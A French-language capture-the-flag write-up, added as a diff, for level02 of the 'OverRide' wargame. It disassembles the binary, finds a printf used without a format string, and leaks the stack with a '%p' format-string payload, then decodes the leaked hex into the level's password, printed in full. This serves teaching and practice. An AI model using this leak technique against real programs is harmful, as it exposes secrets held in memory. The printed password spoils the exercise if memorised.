@@ -1,0 +1,76 @@
+    __               ______ ___ 
+   / /__ _   _____  / / __ \__ \
+  / / _ \ | / / _ \/ / / / /_/ /
+ / /  __/ |/ /  __/ / /_/ / __/ 
+/_/\___/|___/\___/_/\____/____/ 
+                                
+
+* INDEX * 
+
+>$ objdump -d 
+
+On constate la présence du <main>. Etudions l'activitée de ce dernier :
+
+  1) INITIALISATION DE 3 ÉSPACES MÉMOIRE
+     
+    On constate l'intialisation de 3 éspaces memoires qui se suivent :
+     - [-0x70(rbp)]    => str_1
+     - [-0xa0(rbp)]    => str_2          
+     - [-0x110(rbp)]   => str_3
+      
+      
+  2) COPIE DE .PASS DANS str_2
+  
+    - On peut voir que fopen() ouvre notre fichier .pass en readonly,                            fopen("r", "/home/users/level03/.pass")
+      [WARNING] l'aventure avec gdb s'arréte ici du au drop de privilèges
+    - s'en suit l'appel à fread() qui stocke les 41 premiers caractères de .pass dans str_2,     fread(str_2, 1, 41, fd)
+    - puis strcspn() recherche "\n" dans str_2 afin de le remplacer par un "\0",                 strcspn(str_2, "\n")
+    - enfinle fichier .pass est fermé.                                                           fclose(fd)
+     
+  
+  3) COPIE DU 1ER INPUT USERNAME DANS str_1
+  
+    - On peut voir que fgets() copie jusqu'a 100 caractère de notre username dans str_1,
+    - puis strcspn() recherche "\n" dans str_1 afin de le remplacer par un "\0". 
+  
+  
+  4) COPIE DU 1ER INPUT PASSWORD DANS str_3
+    
+    - On peut voir que fgets() copie jusqu'a 100 caractère de notre username dans str_3, 
+    - puis strcspn() recherche "\n" dans str_3 afin de le remplacer par un "\0".
+  
+  
+  5) EXPLOIT
+    
+    - On peut voir qu'un shell s'ouvrira si str_3 == str_1, autrement dis si le mot de passe que nous entrons est égale au contenu du fichier .pass, ce qui semble 
+      impossible car le contenu du fichier .pass est précisement ce qu'il nous faut pour passer au niveau suivant.
+    - On peut aussi voir que si la condition prècédente n'est pas réalisé str_1 nous ai affiché via printf qui est utilisé sans argument ... Ce qui nous rappelle
+      fortement l'utilisation de l'exploit format string
+      
+    >$ level02@OverRide:~$ (python -c 'print("A" * 5 + " %p" * 30)'; python -c 'print("B" * 28)') | ./level02
+       ===== [ Secure Access System v1.0 ] =====
+       /***************************************\
+      | You must login to access this system. |
+       \**************************************/
+       --[ Username: --[ Password: *****************************************
+       AAAAA 0x7fffffffe4a0 (nil) 0x42 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe698 0x1f7ff9a08 0x4242424242424242 0x4242424242424242 0x4242424242424242 
+       0x42424242 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 
+       0x48336750664b394d (nil) 0x7025204141414141 0x2520702520702520 0x2070252070252070 does not have access!
+    
+    
+    On retrouve bien ici :     ---| USERNAME |------| .PASS |------| PASSWORD |----
+                               ---|   str_1  |------| str_2 |------|   str_3  |----
+                               
+    
+    - Le contenu du fichier .pass est donc :
+      0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
+      
+    >$ level02@OverRide:~$ python -c 'print "756e505234376848".decode("hex")[::-1]'
+       Hh74RPnu
+    
+    On répète cette operation pour chacune des chaînes, en les mettant bout à bout on obtient : Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+    
+    
+ Next ...
+                               
+  
